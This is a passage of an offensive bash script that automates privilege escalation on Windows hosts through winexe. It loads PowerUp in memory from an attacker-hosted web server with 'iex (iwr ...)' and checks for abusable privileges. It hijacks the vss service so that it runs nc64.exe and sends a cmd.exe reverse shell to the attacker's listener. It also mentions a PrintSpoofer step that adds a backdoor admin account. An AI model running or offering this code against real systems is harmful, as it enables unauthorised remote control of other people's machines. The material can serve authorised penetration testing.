		$R"If printspoofer worked we have added the user adm1n with password P@ssw0rd"; $RE
		cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Invoke-SweetPotato.ps1 .
		wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
		cp ~/Downloads/nc64.exe .
	fi
	if [ $answer == 2 ]; then
		$G"Saving to WinExe.txt";$RE
		read -p "LHOST" LHOST
		read -p "Local web server port, also start one if you have not yet" WPORT
		WIN="winexe -U $DOMAINIP/$USER%$PASS"
		W=WinExe.txt
		P="powershell -c "
		$G"Whoami"; $RE
		$WIN $P "mkdir C:\Temp"
		$WIN "whoami /all" > $W
		$G"SystemInfo"; $RE
		$WIN "syteminfo" >> $W
		if grep -w "SeImpersonatePrivilege" $W >> $W; then
			$R"SeImpersonatePrivilege is enabled for $USER"
		fi
		$G"Trying to run PowerUp, AMSI may stop us"; $RE
		wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
		echo "Invoke-AllChecks" >> PowerUp.ps1
		$WIN $P "iex (iwr -usebasicparsing http://$LHOST:$WPORT/PowerUp.ps1)" >> $W
		if grep -w "SeManageVolumePrivilege" $W; then
			$R"SeManageVolumePrivilege is enabled for $USER" >> $W; $RE
		fi
	
		if grep -w "Server Operators" $W; then
			$R"Server Operators is enabled for $USER"; $RE
			$WIN $P "wget -usebasicparsing http://$LHOST:$WPORT/nc64.exe -outfile C:\Temp\nc64.exe"
			$WIN $P "sc.exe config vss binpath=""C:\\Temp\\nc64.exe -e cmd.exe $LHOST $LPORT"
			terminator --new-tab -e "nc -lvnp $LPORT;bash"
			$WIN "stop-service vss"
			$WIN "start-service vss"
		fi
		
		if grep -w "DnsAdmins" $W; then
			$R"DNS Admins is enabled for $USER" >> $W;$RE
		fi		

		if grep -w "SeBackupPrivilege" $W; then
			$R"SeBackupPrivilege is enabled for $USER" >> $W; $RE
		fi

		if grep -w "Invoke-ServiceAbuse" $W; then
			$R"There is a service that can be abused, check powerup" >> $W; $RE
		fi
		if grep -w "Get-ServiceUnquoted" $W; then
			$R"There may be some Unquoted Service Paths, check powerup" >> $W; $RE
		fi

	fi
fi
